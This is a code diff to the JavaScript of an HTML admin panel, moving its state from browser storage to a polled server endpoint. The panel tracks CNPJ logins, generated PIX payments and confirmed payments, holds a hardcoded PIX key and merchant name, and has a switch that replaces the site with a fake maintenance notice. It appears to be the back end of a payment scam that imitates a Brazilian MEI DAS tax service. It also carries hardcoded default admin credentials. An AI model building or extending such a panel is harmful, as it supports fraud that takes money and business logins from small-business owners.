@@ -703,59 +703,107 @@
     </div>
 
     <script>
-        const ANALYTICS_STORAGE_KEY = "pgmeiAdminAnalytics";
-        const ADMIN_STORAGE_KEY = "pgmeiAdminCredentials";
+        const API_STATE_ENDPOINT = "/api/state";
         const DEFAULT_ADMIN = { username: "admin", password: "admin123" };
+        const DEFAULT_ANALYTICS_STATE = {
+            visits: 0,
+            uniqueVisitors: 0,
+            totalClicks: 0,
+            cnpjLogins: 0,
+            pixGenerated: 0,
+            paymentsConfirmed: 0,
+            activePage: "primary",
+            pixKey: "6769b9cc-dae0-46f1-88db-3144cc4a7ca7",
+            pixMerchantName: "SERVICO EMPRESARIAL ASSEGURADO ILTDA",
+            pixMerchantCity: "SAO PAULO",
+            secondaryTitle: "Voltaremos em instantes",
+            secondaryMessage: "A equipe da Albuquerque Consultoria MEI DAS esta realizando uma atualizacao programada para melhorar sua experiencia. Em breve o site estara disponivel novamente.",
+            lastVisitAt: "",
+            lastPaymentAt: "",
+            accessLog: [],
+            payments: []
+        };
+        const DEFAULT_APP_STATE = {
+            admin: DEFAULT_ADMIN,
+            analytics: DEFAULT_ANALYTICS_STATE
+        };
+
+        let appStateCache = null;
+        let stateSaveTimer = null;
+        let panelPollingTimer = null;
+
+        function getDefaultAppState() {
+            return JSON.parse(JSON.stringify(DEFAULT_APP_STATE));
+        }
+
+        function mergeAppState(state) {
+            return {
+                admin: Object.assign({}, DEFAULT_APP_STATE.admin, state && state.admin ? state.admin : {}),
+                analytics: Object.assign({}, DEFAULT_APP_STATE.analytics, state && state.analytics ? state.analytics : {})
+            };
+        }
+
+        function getAppState() {
+            if (!appStateCache) {
+                appStateCache = getDefaultAppState();
+            }
+            return appStateCache;
+        }
 
         function getAdminCredentials() {
-            try {
-                const raw = localStorage.getItem(ADMIN_STORAGE_KEY);
-                if (!raw) return DEFAULT_ADMIN;
-                const parsed = JSON.parse(raw);
-                return {
-                    username: parsed.username || DEFAULT_ADMIN.username,
-                    password: parsed.password || DEFAULT_ADMIN.password
-                };
-            } catch (error) {
-                return DEFAULT_ADMIN;
-            }
+            return getAppState().admin || DEFAULT_ADMIN;
         }
 
         function getAnalyticsState() {
-            const fallback = {
-                visits: 0,
-                uniqueVisitors: 0,
-                totalClicks: 0,
-                cnpjLogins: 0,
-                pixGenerated: 0,
-                paymentsConfirmed: 0,
-                activePage: "primary",
-                pixKey: "6769b9cc-dae0-46f1-88db-3144cc4a7ca7",
-                pixMerchantName: "SERVICO EMPRESARIAL ASSEGURADO ILTDA",
-                pixMerchantCity: "SAO PAULO",
-                secondaryTitle: "Voltaremos em instantes",
-                secondaryMessage: "A equipe da Albuquerque Consultoria MEI DAS esta realizando uma atualizacao programada para melhorar sua experiencia. Em breve o site estara disponivel novamente.",
-                lastVisitAt: "",
-                lastPaymentAt: "",
-                accessLog: [],
-                payments: []
-            };
+            return getAppState().analytics || DEFAULT_ANALYTICS_STATE;
+        }
 
+        async function fetchRemoteAppState() {
             try {
-                const raw = localStorage.getItem(ANALYTICS_STORAGE_KEY);
-                if (!raw) return fallback;
-                return Object.assign({}, fallback, JSON.parse(raw));
+                const response = await fetch(API_STATE_ENDPOINT, { cache: "no-store" });
+                if (!response.ok) {
+                    throw new Error("Falha ao carregar estado remoto");
+                }
+                const payload = await response.json();
+                appStateCache = mergeAppState(payload);
             } catch (error) {
-                return fallback;
+                if (!appStateCache) {
+                    appStateCache = getDefaultAppState();
+                }
+            }
+            return getAppState();
+        }
+
+        async function persistAppStateNow() {
+            try {
+                await fetch(API_STATE_ENDPOINT, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(getAppState())
+                });
+            } catch (error) {
+                showToast("error", "Falha ao salvar", "Nao foi possivel sincronizar o painel com o servidor.");
             }
         }
 
+        function queueAppStateSave() {
+            if (stateSaveTimer) {
+                clearTimeout(stateSaveTimer);
+            }
+            stateSaveTimer = setTimeout(() => {
+                stateSaveTimer = null;
+                persistAppStateNow();
+            }, 120);
+        }
+
         function saveAnalyticsState(state) {
-            localStorage.setItem(ANALYTICS_STORAGE_KEY, JSON.stringify(state));
+            getAppState().analytics = Object.assign({}, DEFAULT_ANALYTICS_STATE, state || {});
+            queueAppStateSave();
         }
 
         function saveAdminCredentials(username, password) {
-            localStorage.setItem(ADMIN_STORAGE_KEY, JSON.stringify({ username, password }));
+            getAppState().admin = { username, password };
+            queueAppStateSave();
         }
 
         function showToast(type, title, message) {
@@ -953,10 +1001,28 @@
         document.getElementById("btn-activate-secondary").addEventListener("click", function() {
             pulseButton(this, () => setActivePage("secondary"));
         });
-        window.addEventListener("storage", refreshDashboard);
 
-        refreshDashboard();
-        setDashboardVisible(false);
+        async function initializePanel() {
+            await fetchRemoteAppState();
+            refreshDashboard();
+            setDashboardVisible(false);
+
+            if (panelPollingTimer) {
+                clearInterval(panelPollingTimer);
+            }
+            panelPollingTimer = setInterval(async () => {
+                await fetchRemoteAppState();
+                refreshDashboard();
+            }, 4000);
+        }
+
+        window.addEventListener("beforeunload", () => {
+            if (panelPollingTimer) {
+                clearInterval(panelPollingTimer);
+            }
+        });
+
+        initializePanel();
     </script>
 </body>
 </html>
